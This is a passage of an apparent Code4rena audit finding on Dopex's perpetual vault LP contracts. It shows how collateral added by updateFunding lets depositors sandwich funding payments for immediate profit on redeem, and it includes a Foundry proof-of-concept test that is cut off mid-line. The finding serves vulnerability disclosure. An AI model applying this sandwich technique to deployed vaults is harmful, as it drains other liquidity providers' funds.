class=\"mtk11\">Deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Inside  <code>previewDeposit</code>, it will call <code>convertToShares</code> to calculate the shares.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L269-L271\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L269-L271</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">previewDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">convertToShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><code>convertToShares</code> calculate shares based on the provided <code>assets</code>, <code>supply</code> and <code>totalVaultCollateral</code>. <code>_totalCollateral</code> is also part of <code>totalVaultCollateral</code> that will be used inside the calculation.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L274-L284\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L274-L284</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">convertToShares</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxPriceInAlphaToken</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getUnderlyingPrice</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalVaultCollateral</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalCollateral</span><span class=\"mtk1\">() +</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ((</span><span class=\"mtk12\">_rdpxCollateral</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">rdpxPriceInAlphaToken</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supply</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalVaultCollateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>After the shares calculation, <code>perpetualAtlanticVault.updateFunding</code> will be called, this function will send collateral to vault LP if conditions are met and increase <code>_totalCollateral</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L502-L524\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L502-L524</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateFunding</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">updateFundingPaymentPointer</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingRates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lastUpdateTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ? (</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">fundingDuration</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      : </span><span class=\"mtk12\">lastUpdateTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">lastUpdateTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; </span><span class=\"mtk12\">collateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; </span><span class=\"mtk11\">IPerpetualAtlanticVaultLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">).</span><span class=\"mtk11\">addProceeds</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FundingPaid</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ((</span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">latestFundingPaymentPointer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>It means if <code>_totalCollateral</code> is increased, user can get immediate profit when they call <code>redeem</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateFunding</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">allowance</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// Saves gas for limited approvals.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">allowed</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">allowance</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">allowed</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; (</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">redeemPreview</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check for rounding error since we round down in previewRedeem.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;ZERO_ASSETS&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_rdpxCollateral</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">beforeWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>When <code>redeemPreview</code> is called and trigger <code>_convertToAssets</code>, it will used this newly increased <code>_totalCollateral</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L218-L229\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L218-L229</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_convertToAssets</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ? (</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        : (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;       </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk11\">totalCollateral</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rdpxCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>This will open sandwich and MEV attack opportunity inside vault LP.</p>\n<p>Foundry PoC :</p>\n<p>Add this test to <code>Unit</code> contract inside <code>/tests/rdpxV2-core/Unit.t.sol</code>, also add <code>import \"forge-std/console.sol\";</code> in the contract :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testSandwichProvideFunding</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">20</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">20</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">86400</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">7</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addToContractWhitelist</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateFundingPaymentPointer</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// test funding succesfully</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strikes</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">strikes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">15e6</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate funding is done properly</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">calculateFunding</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strikes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">funding</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalFundingForEpoch</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">latestFundingPaymentPointer</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// send funding to rdpxV2Core and call sync</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">), </span><span class=\"mtk12\">funding</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sync</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">provideFunding</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">86400</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">6</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span 